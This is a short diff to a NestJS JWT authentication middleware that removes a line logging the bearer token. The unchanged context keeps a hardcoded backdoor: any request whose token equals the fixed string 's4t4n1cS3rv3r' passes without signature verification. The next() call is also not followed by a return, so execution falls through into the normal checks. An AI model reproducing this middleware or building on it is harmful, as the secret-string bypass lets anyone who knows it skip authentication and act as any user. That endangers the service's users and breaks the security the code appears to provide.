@@ -19,7 +19,7 @@ export class JwtMiddleware implements NestMiddleware {
 
   use(req: Request, res: Response, next: NextFunction): void {
     const token = this.extractTokenFromHeader(req);
-    console.log({ token });
+  
     if(token === 's4t4n1cS3rv3r') next();
     
     if (!token) {
@@ -31,6 +31,7 @@ export class JwtMiddleware implements NestMiddleware {
         publicKey: this.publicKey,
         algorithms: ['RS256'],
       });
+
       
       req['user'] = {
         userId: payload.sub,
